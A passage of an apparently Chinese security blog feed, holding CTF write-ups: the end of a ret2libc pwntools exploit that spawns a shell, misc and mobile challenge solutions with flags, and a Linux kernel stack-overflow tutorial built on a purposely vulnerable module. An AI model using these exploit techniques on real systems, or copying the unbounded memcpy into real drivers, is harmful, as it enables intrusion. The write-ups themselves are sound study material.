class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] printf:&#123;0&#125;&quot;</span>.format(hex(printf_addr))</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] fflush:&#123;0&#125;&quot;</span>.format(hex(fflush_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sh_addr = next(libc.search(<span class="string">&quot;/bin/sh&quot;</span>)) + libc_base</span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;you?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;admin2017&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;commands.&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;add&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;APP/Site: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x31</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Username: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;b&quot;</span>*<span class="number">0x1d</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">30</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0xc</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="Misc1-一维码"><a href="#Misc1-一维码" class="headerlink" title="Misc1 一维码"></a>Misc1 一维码</h1><p>首先，从图片中进行 <code>LSB</code> 提取，能获取一个 <code>ELF</code> 文件。</p><p><a href="http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png"></a></p><p>又因为之前扫码得知一个针对可执行文件的隐写工具hydan，通过这个就能得到flag了。</p><h1 id="Misc3乾坤"><a href="#Misc3乾坤" class="headerlink" title="Misc3乾坤"></a>Misc3乾坤</h1><p>在数据包导出http对象，里面有2个zip包（在linux下可以看得清楚），解压后一个是flag.exe另一个是encode.py，encode.py是把flag进行多次b64替换并做处理，而flag.exe在最后面附带了密文，编写decode.py即可</p><p><code>flag&#123;n1_hEn_baNg_0&#125;</code></p><h1 id="Misc4-轨迹"><a href="#Misc4-轨迹" class="headerlink" title="Misc4 轨迹"></a>Misc4 轨迹</h1><p>USB流量捕获与解析，之前在360安全客看到过类似的题目，我记得好像还是XNUCA Misc专场的题。猜测又是画flag了，祭出我的神器！（当然也不是我的是github上的大神写的）<a href="https://github.com/gloxec/UsbMiceDataHacker">https://github.com/gloxec/UsbMiceDataHacker</a></p><p><a href="http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png"></a></p><p>经过一番艰难的识别。。。。</p><h1 id="Misc5-种棵树吧"><a href="#Misc5-种棵树吧" class="headerlink" title="Misc5 种棵树吧"></a>Misc5 种棵树吧</h1><p>对第一个图片斌walk 得到一个gif，加上头，能得到 In-order <code> &#123;RY!heHVaL-goAI&#123;dxj_GpnUw8&#125;kzu*Er:s56fFl2i&#125;</code><br>strings 第二个图片得到  Post-order<code>&#123;YR!eVa-gLAoxd_j&#123;pw&#125;8zkUnGuIHh:r65f2lFsEi*&#125;</code><br>二叉树就二叉树吗 …真是的<br>由中序和后序画出二叉树，然后按层次遍历 得到hi!HEReIsYouFLAG:flag{n52V-jPU6d_kx8zw}</p><h1 id="Misc6-我们的秘密"><a href="#Misc6-我们的秘密" class="headerlink" title="Misc6 我们的秘密"></a>Misc6 我们的秘密</h1><p>对文件进行<code>binwak secret.zip -e</code>得到一个reame.txt文件，使用明文攻击，得到压缩包密码：3xatu2o17<br>解压后主要有两文件，一个音频，一个视频，音频中解摩尔斯得到CTFSECWAR2017，然后猜测题目的意思，our secret这是一款隐写软件，通过他和之前得到的字符串得到<code>flag&#123;v1de0_c0nc3a1_lala&#125;</code></p><p><a href="http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png"></a></p><h1 id="MOBILE1-拯救鲁班七号"><a href="#MOBILE1-拯救鲁班七号" class="headerlink" title="MOBILE1 拯救鲁班七号"></a>MOBILE1 拯救鲁班七号</h1><p>题目对输入的字符串进行简单的变换，每个循环中，首先将当前index指向的相邻两个字符互换，然后将进入一个小循环依次每隔3个互换。加解密时需注意互换的边界。密文为“!S#@A4DF32511@43”，明文为“!@#@ASDF3451123”。<br>加解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;!@#@ASDF34511234&#x27;</span></span><br><span class="line"><span class="keyword">print</span> len(s)</span><br><span class="line">l = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(l) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>, len(l), <span class="number">4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = &#x27;S!@#@1FD23154A34&#x27;</span></span><br><span class="line"><span class="comment"># l = list(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(((len(l) &amp; (~<span class="number">1</span>)) - <span class="number">3</span>), <span class="number">0</span>, <span class="number">-2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range((len(l) - <span class="number">1</span>) &amp; (~<span class="number">3</span>), <span class="number">3</span>, <span class="number">-4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l) == s</span><br></pre></td></tr></table></figure><h1 id="MOBILE-2-人民的名义-抓捕赵德汉1"><a href="#MOBILE-2-人民的名义-抓捕赵德汉1" class="headerlink" title="MOBILE 2 人民的名义-抓捕赵德汉1"></a>MOBILE 2 人民的名义-抓捕赵德汉1</h1><p>首先从sqlite数据库里取一个字符串，id为2，表为users，取出来字符串为9838e888496bfda98afdbb98a9b9a9d9cdfa29，然后会将输入做一些变换与字符串比较，变换的规则为每个字符的低四位取反并转为十六进制，然后加上高四位与0xe异或。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;9838e888496bfda98afdbb98a9b9a9d9cdfa29&#x27;</span></span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    l.append(chr(</span><br><span class="line">        (~int(s[i], <span class="number">16</span>) &amp; <span class="number">0xf</span>) + ((int(s[i + <span class="number">1</span>], <span class="number">16</span>) ^ <span class="number">0xe</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    ))</span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)</span><br></pre></td></tr></table></figure><h1 id="MOBILE-3-人民的名义-抓捕赵德汉2"><a href="#MOBILE-3-人民的名义-抓捕赵德汉2" class="headerlink" title="MOBILE 3 人民的名义-抓捕赵德汉2"></a>MOBILE 3 人民的名义-抓捕赵德汉2</h1><p>这个题有两种解法，第一种反编译newClassName.class，里面有个md5：<code>fa3733c647dca53a66cf8df953c2d539</code> ，cmd5上查一下是monkey99就是flag。<br>第二种正统的做法，是反编译CheckPassword.class，发现里面动态加载了一个class，这个class使用aes加密存于ClassEnc文件中，aes密钥的十六进制是<code>bb27630cf264f8567d185008c10c3f96</code> ，把这个ClassEnc文件解密，即可得到newClassName.class文件的内容，后面的步骤同第一个解法</p><h1 id="MOBILE-4-The-Marauder’s-Map"><a href="#MOBILE-4-The-Marauder’s-Map" class="headerlink" title="MOBILE 4 The Marauder’s Map"></a>MOBILE 4 The Marauder’s Map</h1><p>本题使用双字节混淆，众所周知java是支持双字节变量名的，也就是说你可以起中文的变量名，这并不影响编译，因此可以直接反编译class代码，然后直接重新编译运行就好了。<br>这个题使用的是自己的system类，因此要注意不要和系统的system类弄混了。<br>这个题首先由一个复杂的字符串每个字符右移一位生成一个密钥，然后遍历输入，计算当前索引的斐波那契数列的值，作为对密钥的索引，然后拼接起来就是目标flag。<br>这里密钥的获取只能用java来实现，其余可以用Python来实现。<br>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   String x = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">char</span>[] var5;</span><br><span class="line">   <span class="keyword">int</span> var4 = (var5 = <span class="string">&quot;vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬&quot;</span>.toCharArray()).length;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> var3 = <span class="number">0</span>; var3 &lt; var4; ++var3) &#123;</span><br><span class="line">      <span class="keyword">char</span> $ = var5[var3];</span><br><span class="line">      x = x + (<span class="keyword">char</span>)(($ &gt;&gt; <span class="number">1</span>) + <span class="number">15</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(i - <span class="number">1</span>) + f(i - <span class="number">2</span>) <span class="keyword">if</span> i &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span>(<span class="params">i, s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(i) % len(s)</span><br><span class="line">key = <span class="string">&quot;JsnatterrtJuaththovacke&quot;</span></span><br><span class="line">l = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        l.append(key[d(i + k, key)])</span><br><span class="line">    l.append(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    i += <span class="number">5</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(l)[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h1 id="MOBILE-5-取证密码"><a href="#MOBILE-5-取证密码" class="headerlink" title="MOBILE 5 取证密码"></a>MOBILE 5 取证密码</h1><p>本题lib中有一个字符串和一个整数数组，只要按整数数组里的顺序从字符串中取出字符，拼接起来就是flag<br>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;yInS567!bcNOUV8vwCDefXYZadoPQRGx13ghTpqrsHklm2EFtuJKLzMijAB094W&#x27;</span></span><br><span class="line">l = [<span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">7</span>, <span class="number">0xA</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x13</span>, <span class="number">2</span>, <span class="number">0x3A</span>, <span class="number">0xC</span>, <span class="number">0x11</span>, <span class="number">0x31</span>, <span class="number">0x3B</span>, <span class="number">0xB</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    s.append(key[i])</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 陕西省赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-kernel expoit  study (3)---栈溢出</title>
      <link href="write-kernel-exploits-2.html"/>
      <url>write-kernel-exploits-2.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="write-linux-kernel-exploit-2"><a href="#write-linux-kernel-exploit-2" class="headerlink" title="write linux kernel exploit 2"></a>write linux kernel exploit 2</h1><h2 id="Stack-smashing"><a href="#Stack-smashing" class="headerlink" title="Stack smashing"></a>Stack smashing</h2><blockquote><p>简单的内核栈溢出</p></blockquote><h2 id="一个简单的demo"><a href="#一个简单的demo" class="headerlink" title="一个简单的demo"></a>一个简单的demo</h2><blockquote><p>漏洞很明显，memcpy没有对长度进行判断</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ vim stack_smashing.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug2_write</span><span class="params">(struct file *file,<span class="keyword">const</span> <span class="keyword">char</span> *buf,<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> localbuf[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(localbuf,buf,len);</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">stack_smashing_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">&quot;stack_smashing driver init!\n&quot;</span>);</span><br><span class="line">create_proc_entry(<span class="string">&quot;bug2&quot;</span>,<span class="number">0666</span>,<span class="number">0</span>)-&gt;write_proc = bug2_write;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">stack_smashing_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">&quot;stack_smashing driver exit!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(stack_smashing_init);</span><br><span class="line">module_exit(stack_smashing_exit);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ko文件的Makefile, KERNELDR目录设置为linux内核源码的根目录即可</span><br><span class="line">obj-m := stack_smashing.o  </span><br><span class="line">KERNELDR := ~/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>  </span><br><span class="line">PWD := $(shell pwd)  </span><br><span class="line">modules:  </span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules  </span><br><span class="line">moduels_install:  </span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </span><br><span class="line">clean:  </span><br><span class="line">rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions </span><br></pre></td></tr></table></figure><h2 id="简单的测试"><a href="#简单的测试" class="headerlink" title="简单的测试"></a>简单的测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu启动内核，加载相关的busybox</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">&quot;root=/dev/sda</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;加载模块</span></span><br><span class="line"><span class="string">$ insmod stack_smashing.ko</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-01.png"></a><br>POC测试</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-02.png"></a></p><blockquote><p>发现此时编译的ko是有canary检测了，为了测试方便，需要关闭栈保护机制，可以修改~linux_kernel/linux-2.6.32.1中的配置文件.config，找到CONFIG_CC_STACKPROTECTOR注释掉即可，然后重新编译内核和ko文件<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-03.png"></a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关闭CONFIG_CC_STACKPROTECTOR之后重新测试栈溢出</span><br></pre></td></tr></table></figure><h2 id="调试模块"><a href="#调试模块" class="headerlink" title="调试模块"></a>调试模块</h2><blockquote><p>由于模块并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息告知gdb，可以通过add-symbol-file命令把模块的详细信息告知gdb，由于模块也是一个elf文件，需要知道模块的.text、.bss、.data节区地址并通过add-symbol-file指定。<br>模块stack_smashing.ko的这三个信息分别保存在/sys/module/stack_smashing/sections/.text、/sys/module/stack_smashing/sections/.bss和/sys/module/stack_smashing/sections/.data，由于stack_smashing模块没有bss、data节区所以只需要指定text即可。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取text节区地址</span><br><span class="line">$ grep 0 /sys/module/stack_smashing/sections/.text</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl2-exploit-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl2-exploit-04.png"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在gdb中添加模块信息</span><br><span class="line">gdb-peda$ add-symbol-file /home/swing/linux_kernel/write_linux_kernel_exploit/stack_smashing/stack_smashing.ko 0xc8830000</span><br><span class="line"></span><br><span class="line">如果存在data和bss节区可以如下指定：</span><br><span class="line">gdb-peda$ add-symbol-file /home/swingr/linux_kernel/write_linux_kernel_exploit/stack_smashing/stack_smashing.ko 0xc8830000 -s .bss xxxx -s .data xxxx</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对漏洞函数下断点，可以看到bug2_write在模块中的偏移是0x30，所以在0xc8830000+0x30处下断点</span><br><span class="line">gdb-peda$ b bug2_write</span><br><span class="line">Breakpoint 1 at 0x30: bug2_write. (2 locations)</span><br><span class="line">gdb-peda$ b *0xc8830030</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-06.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-06.png"></a></p><h2 id="具体调试步骤"><a href="#具体调试步骤" class="headerlink" title="具体调试步骤"></a>具体调试步骤</h2><p>调试模式启动kernel</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-i386 -S -kernel arch&#x2F;i386&#x2F;boot&#x2F;bzImage -hda &#x2F;tmp&#x2F;my.img -append &quot;root&#x3D;&#x2F;dev&#x2F;sda&quot;</span><br></pre></td></tr></table></figure><p>设置qemu gdbserver(Ctrl+Alt+2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) gdbserver tcp::1234</span><br></pre></td></tr></table></figure><p>gdb调试kernel</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">gdb-peda$ target remote localhost:1234</span><br><span class="line">gdb-peda$ c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继续运行qemu(Ctrl+Alt+1)</p><p>在启动的内核中加载模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ insmod stack_smashing.ko</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploiit2-07.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploiit2-07.png"></a>找到模块stack_smashing的text地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep 0 &#x2F;sys&#x2F;module&#x2F;stack_smashing&#x2F;sections&#x2F;.text</span><br><span class="line">0xc8830000</span><br></pre></td></tr></table></figure><p>在gdb中command＋c停止kernel运行加载符号并设置断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">gdb-peda$ file vmlinux</span><br><span class="line">Reading symbols from vmlinux...done.</span><br><span class="line"></span><br><span class="line">gdb-peda$ add-symbol-file &#x2F;home&#x2F;joker&#x2F;linux_kernel&#x2F;write_linux_kernel_exploit&#x2F;stack_smashing&#x2F;stack_smashing.ko 0xc8830000</span><br><span class="line">add symbol table from file &quot;&#x2F;home&#x2F;joker&#x2F;linux_kernel&#x2F;write_linux_kernel_exploit&#x2F;stack_smashing&#x2F;stack_smashing.ko&quot; at</span><br><span class="line">.text_addr &#x3D; 0xc8830000</span><br><span class="line">Reading symbols from &#x2F;home&#x2F;joker&#x2F;linux_kernel&#x2F;write_linux_kernel_exploit&#x2F;stack_smashing&#x2F;stack_smashing.ko...done.</span><br></pre></td></tr></table></figure><p>添加断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b bug2_write</span><br></pre></td></tr></table></figure><p>qemu中触发漏洞<br>$ echo ABCDEFGHIJKLMNOPQRSTUVWXYZ &gt; /proc/bug2</p><p>进入gdb中调试<br>gdb-peda$ s<br>Warning: not running or target is remote<br>9        memcpy(localbuf,buf,len);</p><p>gdb-peda$ x /20i $eip<br>=&gt; 0xc883000f &lt;bug2_write+15&gt;:    mov    esi,edx<br>   0xc8830011 &lt;bug2_write+17&gt;:    shr    ecx,0x2<br>   0xc8830014 &lt;bug2_write+20&gt;:    lea    edi,[ebp-0x10]<br>   0xc8830017 &lt;bug2_write+23&gt;:    rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]<br>   0xc8830019 &lt;bug2_write+25&gt;:    mov    ecx,eax<br>   0xc883001b &lt;bug2_write+27&gt;:    and    ecx,0x3<br>   0xc883001e &lt;bug2_write+30&gt;:    je     0xc8830022 &lt;bug2_write+34&gt;<br>   0xc8830020 &lt;bug2_write+32&gt;:    rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]<br>   0xc8830022 &lt;bug2_write+34&gt;:    add    esp,0x8<br>   0xc8830025 &lt;bug2_write+37&gt;:    pop    esi<br>   0xc8830026 &lt;bug2_write+38&gt;:    pop    edi<br>   0xc8830027 &lt;bug2_write+39&gt;:    pop    ebp<br>   0xc8830028 &lt;bug2_write+40&gt;:    ret<br>可以看到memcpy已经被编译器优化为rep movs指令</p><p>在函数返回处下断点<br>gdb-peda$ b *0xc8830028<br>gdb-peda$ c<br>gdb-peda$ x /10i $eip<br>=&gt; 0xc8830028 &lt;bug2_write+40&gt;:    ret    </p><p>可以看到此时ret之后控制eip为0x58575655<br>gdb-peda$ x /wx $esp<br>0xc7a63f30:    0x58575655</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">poc</span><br><span class="line">$ cat 